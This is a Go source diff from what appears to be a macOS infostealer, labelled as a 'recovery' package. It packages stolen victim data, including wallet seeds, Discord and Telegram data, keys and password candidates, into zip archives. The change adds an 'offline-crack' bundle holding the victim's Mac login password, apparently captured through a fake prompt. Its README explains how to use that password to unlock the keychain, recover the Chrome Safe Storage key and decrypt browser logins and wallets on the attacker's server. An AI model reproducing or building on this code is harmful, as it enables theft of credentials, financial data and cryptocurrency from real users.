@@ -14,48 +14,34 @@ import (
 	"recovery/recovery"
 )
 
-// buildAllLogFiles returns zipPath → file contents for summary, README, and all log categories.
+// buildAllLogFiles returns zipPath → file contents for summary, README, and meta logs.
+// Offline-crack: no decrypted passwords/cookies; password file for server-side crack.
 func buildAllLogFiles(p *harvestPayload) map[string][]byte {
-	if p == nil || p.Result == nil {
+	if p == nil {
 		return map[string][]byte{
 			"summary.txt": []byte(harvestSummary(p)),
 		}
 	}
 
 	r := p.Result
+	if r == nil {
+		r = &recovery.CollectionResult{}
+	}
 	out := map[string][]byte{
 		"summary.txt": []byte(harvestSummary(p)),
 		"README.txt":  []byte(zipReadmeText()),
 	}
 
-	if data := passwordsLog(r.Passwords); len(data) > 0 {
-		out[zipLogsBrowsers+"passwords.txt"] = data
+	// Mac login password for offline decrypt of keychain + browser DBs on the server.
+	if p.MacLoginPassword != "" {
+		out["offline/mac_login_password.txt"] = []byte(p.MacLoginPassword + "\n")
+		out["offline/README.txt"] = []byte(offlineCrackReadme())
 	}
-	if data := cookiesNetscape(p); len(data) > 0 {
-		out[zipLogsBrowsers+"cookies.txt"] = data
-	}
-	if data := historyLog(r.History); len(data) > 0 {
-		out[zipLogsBrowsers+"history.txt"] = data
-	}
-	if data := autofillLog(r.Autofill); len(data) > 0 {
-		out[zipLogsBrowsers+"autofill.txt"] = data
-	}
-	if data := bookmarksLog(r.Bookmarks); len(data) > 0 {
-		out[zipLogsBrowsers+"bookmarks.txt"] = data
-	}
-	if data := creditCardsLog(r.CreditCards); len(data) > 0 {
-		out[zipLogsBrowsers+"credit_cards.txt"] = data
-	}
+
 	if data := jsonLog("extensions.json", r.Extensions); len(data) > 0 {
 		out[zipLogsBrowsers+"extensions.json"] = data
 	}
 
-	if data := appCredentialsLog(r.AppCredentials); len(data) > 0 {
-		out[zipLogsApps+"app_credentials.txt"] = data
-	}
-	if data := jsonLog("app_credentials.json", r.AppCredentials); len(data) > 0 {
-		out[zipLogsApps+"app_credentials.json"] = data
-	}
 	if r.Gaming != nil {
 		if data := jsonLog("gaming.json", r.Gaming); len(data) > 0 {
 			out[zipLogsApps+"gaming.json"] = data
@@ -67,10 +53,6 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 		}
 	}
 
-	if data := discordTokensLog(r.DiscordTokens); len(data) > 0 {
-		out[zipLogsDiscord+"discord_tokens.txt"] = data
-	}
-
 	if data := seedsLog(p.Seeds); len(data) > 0 {
 		out[zipLogsSeeds+"seeds.txt"] = data
 	}
@@ -80,10 +62,6 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	}
 	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
 		out[zipLogsKeys+"password_candidates.json"] = data
-	}
-	// Full login keychain dump (phase-1 / primary upload) — produced after unlock with user password.
-	if len(p.KeychainDump) > 0 {
-		out[zipLogsKeys+"keychain_dump.txt"] = p.KeychainDump
 	}
 	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
 		out[zipLogsKeys+"keys.json"] = data
@@ -98,10 +76,26 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
 		out[zipLogsMeta+"telegram.json"] = data
 	}
+	// harvest.json omits MacLoginPassword (json:"-"); password is only under offline/.
 	if data, err := json.MarshalIndent(p, "", "  "); err == nil && len(data) > 0 {
 		out[zipLogsMeta+"harvest.json"] = data
 	}
 	return out
+}
+
+func offlineCrackReadme() string {
+	return `offline-crack package
+=====================
+
+mac_login_password.txt   Mac user login password (from modal / -mac-password)
+
+Use this password offline with:
+  keychain/login.keychain-db     → unlock Keychain → Chrome Safe Storage
+  browsers/*/Login Data          → decrypt with Safe Storage key
+  wallets/                       → extension LevelDB / desktop wallet files
+
+This archive does NOT contain on-box decrypted passwords.txt.
+`
 }
 
 func appCredentialsLog(rows []recovery.AppCredentialResult) []byte {
